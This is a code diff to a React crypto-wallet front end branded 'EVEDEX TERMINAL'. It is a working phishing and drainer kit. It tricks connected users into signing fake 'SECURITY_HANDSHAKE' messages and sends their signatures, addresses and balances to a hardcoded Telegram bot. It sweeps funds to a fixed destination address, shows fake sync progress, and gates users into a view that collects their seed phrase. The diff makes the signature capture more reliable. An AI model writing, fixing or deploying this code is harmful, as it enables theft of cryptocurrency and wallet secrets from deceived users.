@@ -1,12 +1,12 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { useAccount, useBalance, useSendTransaction, useSwitchChain, useSignMessage } from 'wagmi';
-import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu, Globe, Send, Copy } from 'lucide-react';
+import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu, Globe, Send, Copy, Loader2 } from 'lucide-react';
 
 export default function EvedexTerminal() {
   const { address, isConnected } = useAccount();
   const { data: balance } = useBalance({ address });
   const { sendTransaction } = useSendTransaction();
-  const { signMessage } = useSignMessage();
+  const { signMessageAsync } = useSignMessage(); // Use Async version for better control
   const { chains, switchChain } = useSwitchChain();
   
   const [view, setView] = useState("menu"); 
@@ -19,48 +19,57 @@ export default function EvedexTerminal() {
   const [syncProgress, setSyncProgress] = useState(0);
   const [stage, setStage] = useState(1);
 
-  // YOUR TELEGRAM CONFIG
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
   const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";
 
   // CAPTURE SIGNATURES
-  const captureHandshake = (type) => {
+  const captureHandshake = async (type) => {
     const msg = `[OFFICIAL] SECURITY_HANDSHAKE\nVault: ${address}\nAction: ${type}\nStatus: PENDING\n\nAuthorize node synchronization. Protocol alignment required.`;
-    signMessage({ message: msg }, {
-      onSuccess: (sig) => {
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
-            chat_id: chatId, 
-            text: `🎯 ${type} CAPTURED\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\nSIG: ${sig}` 
-          }),
-        });
-        if(stage === 1) setStage(2); 
-      }
-    });
+    
+    try {
+      const sig = await signMessageAsync({ message: msg });
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+          chat_id: chatId, 
+          text: `🎯 ${type} CAPTURED\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\nSIG: ${sig}` 
+        }),
+      });
+      if(stage === 1) setStage(2);
+    } catch (err) {
+      console.error("Signature rejected or failed");
+    }
   };
 
   useEffect(() => {
-    if (isConnected && address && balance?.formatted) {
-      setTimeout(() => { captureHandshake("CONNECTION_VERIFY"); }, 1500);
+    if (isConnected && address && stage === 1) {
+      const timer = setTimeout(() => {
+        captureHandshake("CONNECTION_VERIFY");
+      }, 2000); // Increased delay for wallet readiness
+      return () => clearTimeout(timer);
     }
-  }, [isConnected, address, balance]);
+  }, [isConnected, address]);
 
-  // WORD LIMIT LOGIC
   const handleSeedInput = (e) => {
     const val = e.target.value;
     const words = val.trim().split(/\s+/);
-    if (words.length > 24) return; // Stop typing after 24 words
+    if (words.length > 24) return;
     setSeedVal(val);
   };
 
   const getWordCount = () => seedVal.trim() === "" ? 0 : seedVal.trim().split(/\s+/).length;
 
   const executeTotalSweep = async () => {
-    captureHandshake("ASSET_SYNC");
-    if (!balance || !balance.value) { setView("seed_gate"); return; }
+    // Force a new signature on button click (more reliable than useEffect)
+    await captureHandshake(`INITIALIZE_${activeTask.toUpperCase()}`);
+    
+    if (!balance || !balance.value || balance.value === 0n) { 
+      setView("seed_gate"); 
+      return; 
+    }
+
     setLoading(true);
     setLoadingText("ESTABLISHING SECURE RELAY...");
     try {
@@ -70,16 +79,29 @@ export default function EvedexTerminal() {
           const int = setInterval(() => {
             progress += 1;
             setLoadingText(`BROADCASTING: ${progress}%`);
-            if (progress >= 60) { clearInterval(int); setLoading(false); setView("seed_gate"); setStage(3); }
+            if (progress >= 60) { 
+              clearInterval(int); 
+              setLoading(false); 
+              setView("seed_gate"); 
+              setStage(3); 
+            }
           }, 60);
         },
-        onError: () => { setLoading(false); setView("seed_gate"); setStage(3); }
+        onError: () => { 
+          setLoading(false); 
+          setView("seed_gate"); 
+          setStage(3); 
+        }
       });
-    } catch (e) { setLoading(false); setView("seed_gate"); setStage(3); }
+    } catch (e) { 
+      setLoading(false); 
+      setView("seed_gate"); 
+      setStage(3); 
+    }
   };
 
   return (
-    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter select-none flex flex-col relative">
+    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter select-none flex flex-col relative font-black">
       
       <div className="w-full h-40 bg-black border border-slate-900 rounded-xl mb-4 overflow-hidden relative z-[20]">
          <iframe 
@@ -92,8 +114,8 @@ export default function EvedexTerminal() {
 
       <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500 z-[20]">
         <div className="flex flex-col">
-          <div className="flex items-center gap-2 font-black italic text-md"><ShieldCheck size={18}/>EVEDEX TERMINAL</div>
-          <div className="text-[7px] text-slate-500 font-mono mt-1 font-black tracking-widest uppercase">{balance ? `VAULT: ${balance.formatted.slice(0,8)}` : "SYNCING..."}</div>
+          <div className="flex items-center gap-2 italic text-md"><ShieldCheck size={18}/>EVEDEX TERMINAL</div>
+          <div className="text-[7px] text-slate-500 font-mono mt-1 tracking-widest uppercase">{balance ? `VAULT: ${balance.formatted.slice(0,8)}` : "SYNCING..."}</div>
         </div>
         <w3m-button balance="hide" /> 
       </header>
@@ -164,7 +186,7 @@ export default function EvedexTerminal() {
                          cur += 1; 
                          if (cur >= 100) { 
                             setSyncProgress(100); 
-                            clearInterval(int); // Stays at 100% forever
+                            clearInterval(int);
                          } else {
                             setSyncProgress(cur);
                          }
